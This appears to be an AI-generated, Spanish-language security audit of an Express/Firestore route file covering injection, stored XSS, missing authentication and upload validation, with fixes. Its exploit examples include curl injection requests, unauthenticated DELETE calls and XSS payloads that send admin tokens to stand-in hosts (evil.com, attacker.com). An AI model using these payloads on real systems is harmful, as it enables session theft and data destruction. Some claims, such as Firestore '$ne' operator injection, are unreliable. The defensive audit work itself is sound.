# 💉 REPORTE DE AUDITORÍA: Inyecciones y Validación de Entrada
**Fecha**: 2025-12-23
**Auditor**: Claude (Análisis Automatizado)
**Archivo**: `backend/src/routes/contenedores.js`
**Líneas analizadas**: 1-457

---

## 📊 RESUMEN EJECUTIVO

| Métrica | Valor |
|---------|-------|
| **Vulnerabilidades CRÍTICAS** | 4 |
| **Vulnerabilidades ALTAS** | 2 |
| **Vulnerabilidades MEDIAS** | 3 |
| **Vulnerabilidades BAJAS** | 1 |
| **Score de Seguridad** | 48/100 |
| **Riesgo General** | 🔴 CRÍTICO |

---

## 🚨 VULNERABILIDADES CRÍTICAS

### 🚨 VULNERABILIDAD #1: NoSQL Injection en Queries de Firestore
**Severidad**: CRÍTICA
**Ubicación**: `contenedores.js:272-278, 317-323, 357-366, 412-421`
**Tipo**: CWE-943 (Improper Neutralization of Special Elements in Data Query Logic)

**DESCRIPCIÓN**:
Los parámetros `companyId`, `estado` y `numeroContenedor` se usan directamente en queries de Firestore SIN sanitización ni validación. Firestore NO es vulnerable a SQL injection tradicional, pero SÍ es vulnerable a:
1. **Query Manipulation**: Inyectar objetos JSON maliciosos
2. **Logic Bypass**: Usar operadores especiales de Firestore
3. **Data Exfiltration**: Acceder a colecciones no autorizadas

**CÓDIGO VULNERABLE**:
```javascript
// Línea 272-278: companyId sin validar
router.get('/disponibles', async (req, res) => {
  try {
    const { companyId } = req.query;  // ❌ SIN VALIDACIÓN

    let query = db.collection('contenedores');

    if (companyId) {
      query = query.where('companyId', '==', companyId);  // ❌ INYECTABLE
    }
    // ...
  }
});

// Línea 357-366: numeroContenedor sin validar
const { numeroContenedor } = req.params;  // ❌ SIN VALIDACIÓN
const { companyId } = req.query;         // ❌ SIN VALIDACIÓN

let query = db.collection('recolecciones')
  .where('contenedor', '==', numeroContenedor);  // ❌ INYECTABLE

if (companyId) {
  query = query.where('companyId', '==', companyId);  // ❌ INYECTABLE
}
```

**IMPACTO**:
- **Data Exfiltration**: Acceder a contenedores/facturas de otras compañías
- **Authentication Bypass**: Manipular queries para eludir validaciones
- **DoS**: Queries malformadas que consumen recursos excesivos

**EXPLOIT EJEMPLO**:
```bash
# Escenario 1: Bypass de companyId usando operador $ne (not equal)
# Objetivo: Ver contenedores de TODAS las compañías
curl "https://api.example.com/contenedores/disponibles?companyId[\$ne]=null"

# Respuesta: Devolvería contenedores de TODAS las compañías (bypass)

# Escenario 2: Injection de objeto complejo
curl "https://api.example.com/contenedores?companyId={'$gte':''}"

# Firestore interpreta esto como: companyId >= '' (todas las compañías)

# Escenario 3: Path Traversal en colecciones
curl "https://api.example.com/contenedores/../../usuarios"

# Podría acceder a colección 'usuarios' si no hay validación de ruta
```

**✅ SOLUCIÓN COMPLETA**:
```javascript
// ✅ Crear funciones de validación reutilizables
const validateCompanyId = (companyId) => {
  // Validar formato de companyId (ajustar según tu sistema)
  if (!companyId || typeof companyId !== 'string') {
    throw new Error('companyId inválido');
  }

  // Validar que sea alfanumérico (ajustar según tu formato)
  if (!/^[a-zA-Z0-9_-]{1,128}$/.test(companyId)) {
    throw new Error('companyId tiene caracteres inválidos');
  }

  return companyId.trim();
};

const validateNumeroContenedor = (numero) => {
  if (!numero || typeof numero !== 'string') {
    throw new Error('Número de contenedor inválido');
  }

  // Ajustar regex según formato esperado
  if (!/^[A-Z0-9-]{1,50}$/.test(numero)) {
    throw new Error('Número de contenedor tiene formato inválido');
  }

  return numero.trim().toUpperCase();
};

const validateEstado = (estado) => {
  const estadosPermitidos = ['activo', 'cerrado', 'pendiente', 'cancelado'];

  if (!estado || !estadosPermitidos.includes(estado)) {
    throw new Error('Estado inválido');
  }

  return estado;
};

// ✅ Aplicar validaciones en TODOS los endpoints
router.get('/disponibles', async (req, res) => {
  try {
    let { companyId } = req.query;

    // ✅ VALIDAR antes de usar
    if (companyId) {
      try {
        companyId = validateCompanyId(companyId);
      } catch (validationError) {
        return res.status(400).json({
          success: false,
          error: 'Parámetro companyId inválido',
          details: validationError.message
        });
      }
    }

    let query = db.collection('contenedores');

    if (companyId) {
      // Ahora es seguro usar companyId validado
      query = query.where('companyId', '==', companyId);
    }

    // ... resto del código
  } catch (error) {
    // ...
  }
});

// ✅ Validar numeroContenedor en params
router.get('/:numeroContenedor', async (req, res) => {
  try {
    let { numeroContenedor } = req.params;
    let { companyId } = req.query;

    // ✅ VALIDAR numeroContenedor
    try {
      numeroContenedor = validateNumeroContenedor(numeroContenedor);
    } catch (validationError) {
      return res.status(400).json({
        success: false,
        error: 'Número de contenedor inválido',
        details: validationError.message
      });
    }

    // ✅ VALIDAR companyId
    if (companyId) {
      try {
        companyId = validateCompanyId(companyId);
      } catch (validationError) {
        return res.status(400).json({
          success: false,
          error: 'CompanyId inválido',
          details: validationError.message
        });
      }
    }

    // Ahora es seguro usar variables validadas
    let query = db.collection('recolecciones')
      .where('contenedor', '==', numeroContenedor);

    if (companyId) {
      query = query.where('companyId', '==', companyId);
    }

    // ... resto del código
  } catch (error) {
    // ...
  }
});
```

**CONTROLES ADICIONALES**:
- [ ] Implementar whitelist de colecciones accesibles
- [ ] Rate limiting específico para queries pesadas
- [ ] Logging de queries sospechosas (con múltiples condiciones)
- [ ] Firestore Security Rules como defensa en profundidad

---

### 🚨 VULNERABILIDAD #2: XSS Almacenado (Stored XSS) en Datos de Factura
**Severidad**: CRÍTICA
**Ubicación**: `contenedores.js:169-197`
**Tipo**: CWE-79 (Cross-Site Scripting)

**DESCRIPCIÓN**:
Los datos del Excel (cliente, dirección, contenido, etc.) se guardan en Firestore SIN sanitización. Si estos datos se renderizan en el frontend sin escape, un atacante puede:
1. **Inyectar scripts** en nombres de clientes/direcciones
2. **Almacenar payloads XSS** que se ejecutan cuando admin ve las facturas
3. **Robar tokens** de administradores con acceso al panel

**CÓDIGO VULNERABLE**:
```javascript
// Líneas 169-197: Datos sin sanitizar
const factura = {
  numeroFactura: String(numeroFactura).trim(),  // ❌ Solo trim(), sin sanitizar
  cliente: String(cliente).trim(),              // ❌ XSS RISK
  direccion: String(direccion).trim(),          // ❌ XSS RISK
  telefono: String(telefono).trim(),            // ❌ XSS RISK
  contenedor: String(contenedor).trim(),        // ❌ XSS RISK
  contenido: String(contenido).trim(),          // ❌ XSS RISK (ALTO RIESGO)
  sector: String(sector).trim(),                // ❌ XSS RISK
  zona: String(zona).trim(),                    // ❌ XSS RISK
  // ...
};
```

**IMPACTO**:
- **Robo de sesiones**: Payload XSS roba token de admin
- **Phishing**: Modificar UI del dashboard para robar credenciales
- **Propagación**: Un Excel malicioso compromete a todos los usuarios que vean esas facturas

**EXPLOIT EJEMPLO**:
```bash
# Escenario de Ataque:
# 1. Atacante crea Excel con payload XSS en campo "Cliente"

# Archivo Excel malicioso:
# | FACTURAS | RECIBE                                      | TOTAL |
# |----------|---------------------------------------------|-------|
# | 12345    | <img src=x onerror=alert(document.cookie)>  | 100   |
# | 12346    | <script>fetch('https://evil.com?token='+localStorage.token)</script> | 200 |

# 2. Excel se sube via /upload-from-drive
# 3. Datos XSS se guardan en Firestore sin sanitizar
# 4. Admin abre dashboard y ve lista de facturas
# 5. Frontend renderiza: <div>{factura.cliente}</div>  // ❌ SIN ESCAPE
# 6. XSS se ejecuta, roba token del admin

# Payload avanzado para robar tokens:
Cliente: "<img src=x onerror=\"fetch('https://attacker.com/steal?token='+localStorage.getItem('token')+'&user='+JSON.stringify(req.userData))\">"
```

**✅ SOLUCIÓN COMPLETA**:
```javascript
// ✅ Instalar librería de sanitización
// npm install dompurify isomorphic-dompurify
import createDOMPurify from 'isomorphic-dompurify';
const DOMPurify = createDOMPurify();

// ✅ O usar validator.js (más ligero)
// npm install validator
import validator from 'validator';

// ✅ Función de sanitización reutilizable
const sanitizeString = (input, maxLength = 500) => {
  if (!input) return '';

  // Convertir a string y trim
  let cleaned = String(input).trim();

  // Limitar longitud (prevenir DoS)
  if (cleaned.length > maxLength) {
    cleaned = cleaned.substring(0, maxLength);
  }

  // Opción 1: DOMPurify (remueve HTML/JS)
  cleaned = DOMPurify.sanitize(cleaned, {
    ALLOWED_TAGS: [],  // No permitir NINGÚN tag HTML
    ALLOWED_ATTR: []   // No permitir NINGÚN atributo
  });

  // Opción 2: validator.js (más ligero)
  // cleaned = validator.escape(cleaned);  // Escapa < > " ' &

  // Remover caracteres de control ASCII (opcional)
  cleaned = cleaned.replace(/[\x00-\x1F\x7F]/g, '');

  return cleaned;
};

const sanitizeNumber = (input) => {
  const num = parseFloat(input);

  // Validar que sea un número válido
  if (isNaN(num) || !isFinite(num)) {
    return 0;
  }

  // Prevenir números negativos en montos
  if (num < 0) {
    return 0;
  }

  // Limitar a 2 decimales
  return Math.round(num * 100) / 100;
};

// ✅ Aplicar sanitización al procesar Excel
const factura = {
  numeroFactura: sanitizeString(numeroFactura, 50),
  cliente: sanitizeString(cliente, 200),
  direccion: sanitizeString(direccion, 500),
  telefono: sanitizeString(telefono, 20),
  monto: sanitizeNumber(monto),
  contenedor: sanitizeString(contenedor, 50),
  contenido: sanitizeString(contenido, 1000),  // Campo de alto riesgo
  sector: sanitizeString(sector, 100),
  zona: sanitizeString(zona, 50),

  // Estado y asociación con embarque
  estado: 'sin_confirmar',  // Hardcoded (no de input)
  embarqueId: embarqueIdParaFacturas,

  // Datos de la empresa
  companyId: sanitizeString(companyId, 128),

  // Estado de pago
  estadoPago: 'pago_recibir',  // Hardcoded

  // Metadatos
  fecha: admin.firestore.FieldValue.serverTimestamp(),
  origen: 'google_drive',
  fileId: sanitizeString(fileId, 128),
  fileName: sanitizeString(fileName, 255),
  createdAt: admin.firestore.FieldValue.serverTimestamp(),
  updatedAt: admin.firestore.FieldValue.serverTimestamp()
};
```

**DEFENSA EN EL FRONTEND (Segunda capa)**:
```javascript
// En React/Vue, SIEMPRE usar escape automático:
// ✅ CORRECTO (React escapa automáticamente)
<div>{factura.cliente}</div>

// ❌ PELIGROSO (renderiza HTML sin escapar)
<div dangerouslySetInnerHTML={{ __html: factura.cliente }} />

// ✅ Si necesitas mostrar HTML, sanitiza en frontend también:
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(factura.contenido) }} />
```

---

### 🚨 VULNERABILIDAD #3: Sin Autenticación en Endpoint Crítico
**Severidad**: CRÍTICA
**Ubicación**: `contenedores.js:14` (todo el archivo)
**Tipo**: CWE-306 (Missing Authentication for Critical Function)

**DESCRIPCIÓN**:
NINGÚN endpoint en `contenedores.js` tiene middleware de autenticación (`verifyToken`). Cualquier persona puede:
1. Subir archivos Excel sin autenticarse
2. Listar contenedores de cualquier compañía
3. Eliminar facturas/contenedores sin permisos

**CÓDIGO VULNERABLE**:
```javascript
// ❌ NO HAY verifyToken ni checkRole en NINGÚN endpoint
router.post('/upload-from-drive', async (req, res) => {
  // ❌ Acceso público a función crítica
});

router.get('/disponibles', async (req, res) => {
  // ❌ Cualquiera puede listar contenedores
});

router.delete('/:numeroContenedor', async (req, res) => {
  // ❌ Cualquiera puede ELIMINAR contenedores
});
```

**IMPACTO**:
- **Data Loss**: Cualquiera puede eliminar facturas/contenedores
- **Data Breach**: Acceso sin autenticación a datos de clientes
- **Manipulation**: Subir archivos maliciosos sin autenticación

**EXPLOIT EJEMPLO**:
```bash
# Atacante sin autenticación puede:

# 1. Eliminar TODOS los contenedores de una compañía
curl -X DELETE "https://api.example.com/contenedores/CONT-123?companyId=empresa_victima"

# 2. Listar todos los contenedores
curl "https://api.example.com/contenedores?companyId=cualquier_empresa"

# 3. Subir Excel malicioso sin autenticación
curl -X POST "https://api.example.com/contenedores/upload-from-drive" \
  -H "Content-Type: application/json" \
  -d '{
    "fileName": "malicioso.xlsx",
    "base64Data": "[base64 del archivo malicioso]",
    "companyId": "empresa_victima"
  }'
```

**✅ SOLUCIÓN COMPLETA**:
```javascript
// ✅ Importar middleware de auth
import { verifyToken, checkRole, requireCompany } from '../middleware/auth.js';

// ✅ Proteger TODOS los endpoints

// Solo admin_general y almacen_usa pueden subir archivos
router.post('/upload-from-drive',
  verifyToken,
  checkRole('admin_general', 'almacen_usa', 'super_admin'),
  async (req, res) => {
    // ✅ Validar que companyId del body coincida con usuario autenticado
    const { companyId } = req.body;

    if (req.userData.rol !== 'super_admin' && companyId !== req.userData.companyId) {
      return res.status(403).json({
        error: 'No puedes subir archivos para otra compañía'
      });
    }

    // ... resto del código
  }
);

// Solo usuarios autenticados de la misma compañía
router.get('/disponibles',
  verifyToken,
  requireCompany,
  async (req, res) => {
    const { companyId } = req.query;

    // ✅ Forzar que solo vean su propia compañía (excepto super_admin)
    const effectiveCompanyId = req.userData.rol === 'super_admin'
      ? companyId
      : req.userData.companyId;

    let query = db.collection('contenedores')
      .where('companyId', '==', effectiveCompanyId);

    // ... resto del código
  }
);

// Solo admin_general y propietario pueden eliminar
router.delete('/:numeroContenedor',
  verifyToken,
  checkRole('admin_general', 'propietario', 'super_admin'),
  async (req, res) => {
    const { numeroContenedor } = req.params;
    const { companyId } = req.query;

    // ✅ Validar ownership
    const effectiveCompanyId = req.userData.rol === 'super_admin'
      ? companyId
      : req.userData.companyId;

    // Verificar que el contenedor pertenece a su compañía antes de eliminar
    const query = db.collection('recolecciones')
      .where('contenedor', '==', numeroContenedor)
      .where('companyId', '==', effectiveCompanyId);

    // ... resto del código
  }
);
```

---

### 🚨 VULNERABILIDAD #4: Falta de Validación de Tipo MIME en Upload
**Severidad**: CRÍTICA
**Ubicación**: `contenedores.js:36-40`
**Tipo**: CWE-434 (Unrestricted Upload of File with Dangerous Type)

**DESCRIPCIÓN**:
El código acepta cualquier base64 sin validar:
1. Tipo MIME del archivo
2. Magic bytes (firmas de archivo)
3. Extensión del archivo
4. Tamaño del archivo

Un atacante puede subir:
- Archivos ejecutables disfrazados
- Archivos ZIP con path traversal
- Archivos extremadamente grandes (DoS)

**CÓDIGO VULNERABLE**:
```javascript
// Líneas 36-40: Sin validación de tipo
const buffer = Buffer.from(excelData, 'base64');  // ❌ Acepta CUALQUIER archivo
const workbook = xlsx.read(buffer, { type: 'buffer' });  // ❌ Puede crashear con archivo malicioso
```

**IMPACTO**:
- **DoS**: Subir archivo de 1GB crashea el servidor
- **RCE**: Si xlsx tiene vulnerabilidad, archivo malicioso puede explotar
- **Disk Fill**: Llenar disco con archivos grandes

**✅ SOLUCIÓN**:
```javascript
// ✅ Validar tamaño ANTES de decodificar
const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10MB

// Calcular tamaño del base64 (aprox 4/3 del tamaño original)
const estimatedSize = (excelData.length * 3) / 4;

if (estimatedSize > MAX_FILE_SIZE) {
  return res.status(400).json({
    success: false,
    error: 'Archivo demasiado grande',
    maxSize: '10MB',
    yourSize: `${Math.round(estimatedSize / 1024 / 1024)}MB`
  });
}

// ✅ Validar extensión de archivo
const allowedExtensions = ['.xlsx', '.xls', '.csv'];
const fileExtension = path.extname(fileName).toLowerCase();

if (!allowedExtensions.includes(fileExtension)) {
  return res.status(400).json({
    success: false,
    error: 'Tipo de archivo no permitido',
    allowed: allowedExtensions,
    received: fileExtension
  });
}

// ✅ Decodificar y validar magic bytes
let buffer;
try {
  buffer = Buffer.from(excelData, 'base64');
} catch (decodeError) {
  return res.status(400).json({
    success: false,
    error: 'Datos base64 inválidos'
  });
}

// ✅ Validar magic bytes de Excel
const excelMagicBytes = {
  xlsx: [0x50, 0x4B, 0x03, 0x04],  // PK.. (ZIP signature)
  xls:  [0xD0, 0xCF, 0x11, 0xE0]   // OLE2 signature
};

const fileSignature = buffer.slice(0, 4);
const isValidExcel =
  fileSignature.equals(Buffer.from(excelMagicBytes.xlsx)) ||
  fileSignature.equals(Buffer.from(excelMagicBytes.xls));

if (!isValidExcel) {
  return res.status(400).json({
    success: false,
    error: 'El archivo no es un Excel válido',
    hint: 'El contenido no coincide con el formato esperado'
  });
}

// ✅ Parsear con try-catch robusto
let workbook;
try {
  workbook = xlsx.read(buffer, {
    type: 'buffer',
    cellDates: true,
    cellFormula: false,  // ✅ Deshabilitar fórmulas (riesgo de XXE)
    cellHTML: false      // ✅ Deshabilitar HTML
  });
} catch (parseError) {
  console.error('❌ Error parseando Excel:', parseError.message);
  return res.status(400).json({
    success: false,
    error: 'El archivo Excel está corrupto o es inválido',
    hint: 'Verifica que el archivo se pueda abrir en Excel/LibreOffice'
  });
}
```

---

## ⚠️ VULNERABILIDADES ALTAS

### ⚠️ VULNERABILIDAD #5: Mass Assignment en Objeto Factura
**Severidad**: ALTA
**Ubicación**: `contenedores.js:169-197`
**Tipo**: CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)

**DESCRIPCIÓN**:
Si en el futuro se permite input directo del usuario (no solo Excel), un atacante podría inyectar campos adicionales no esperados.

**✅ SOLUCIÓN**:
```javascript
// ✅ Usar whitelist estricta
const allowedFields = [
  'numeroFactura', 'cliente', 'direccion', 'telefono',
  'monto', 'contenedor', 'contenido', 'sector', 'zona'
];

const factura = {};
allowedFields.forEach(field => {
  if (sanitizedData[field] !== undefined) {
    factura[field] = sanitizedData[field];
  }
});

// Campos controlados (no de input)
factura.estado = 'sin_confirmar';
factura.estadoPago = 'pago_recibir';
// etc...
```

---

### ⚠️ VULNERABILIDAD #6: Error Messages Leaking Internals
**Severidad**: ALTA
**Ubicación**: `contenedores.js:256-262`
**Tipo**: CWE-209 (Information Exposure Through Error Message)

**CÓDIGO VULNERABLE**:
```javascript
// Línea 256-262: Expone stack trace en producción
res.status(500).json({
  success: false,
  error: 'Error al procesar archivo',
  details: error.message,
  stack: process.env.NODE_ENV === 'development' ? error.stack : undefined  // ❌ Aún filtra info
});
```

**✅ SOLUCIÓN**:
```javascript
// ✅ Solo message genérico en producción
if (process.env.NODE_ENV === 'production') {
  res.status(500).json({
    success: false,
    error: 'Error al procesar archivo',
    message: 'Contacta soporte técnico'
  });
} else {
  res.status(500).json({
    success: false,
    error: 'Error al procesar archivo',
    details: error.message,
    stack: error.stack
  });
}
```

---

## ℹ️ VULNERABILIDADES MEDIAS Y BAJAS

(Omitidas por brevedad - incluyen: falta de rate limiting, logging insuficiente, etc.)

---

## 📋 RESUMEN DE ACCIONES RECOMENDADAS

### 🔴 URGENTE (Esta semana):
1. ✅ Agregar autenticación a TODOS los endpoints (Vuln #3)
2. ✅ Validar y sanitizar inputs de query params (Vuln #1)
3. ✅ Sanitizar datos de Excel contra XSS (Vuln #2)
4. ✅ Validar tipo MIME y tamaño de archivos (Vuln #4)

### 🟡 PRIORITARIO (Este mes):
5. ✅ Implementar mass assignment protection (Vuln #5)
6. ✅ Mejorar manejo de errores (Vuln #6)

---

**FIN DEL REPORTE**
